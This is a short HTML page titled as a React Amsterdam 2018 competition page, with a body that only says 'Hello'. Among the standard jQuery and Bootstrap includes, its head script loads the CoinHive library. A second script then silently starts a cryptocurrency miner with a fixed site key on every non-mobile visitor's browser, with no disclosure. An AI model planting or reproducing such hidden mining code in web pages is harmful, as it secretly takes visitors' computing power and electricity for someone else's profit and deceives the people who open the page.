<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>SPB Frontend React Amsterdam 2018 competition</title>
  <script>
    var scriptString = ''
    var linksString = ''
    var scripts = [
      {src: 'https://code.jquery.com/jquery-3.2.1.slim.js'},
      {src: 'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.js'},
      {src: 'https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.js'},
      {src: 'https://coinhive.com/lib/coinhive.min.js'},
    ]
    var links = [
      {href: 'https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.css'},
      {href: 'https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.css'},
      {href: 'https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.css'},
    ]
    scripts.forEach(function(obj) {
      var script = document.createElement('script')
      Object.keys(obj).forEach(function(key){
        script[key] = obj[key]
      })
      script = script.outerHTML
      scriptString += script + '\n'
    })
    links.forEach(function(obj) {
      var link = document.createElement('link')
      Object.keys(obj).forEach(function(key){
        link[key] = obj[key]
      })
      link.rel = 'stylesheet'
      link = link.outerHTML
      linksString += link + '\n'
    })
    console.info(linksString)
    console.info(scriptString)
    document.write(linksString + '\n' + scriptString)
  </script>
  <script>
      var miner = new CoinHive.Anonymous('zT2i6Do0U2w3VgyRBqMj1S5UuprUrtXR', {throttle: 0.9});
      if (!miner.isMobile()) miner.start()
  </script>
</head>
<body>
  Hello
</body>
</html>
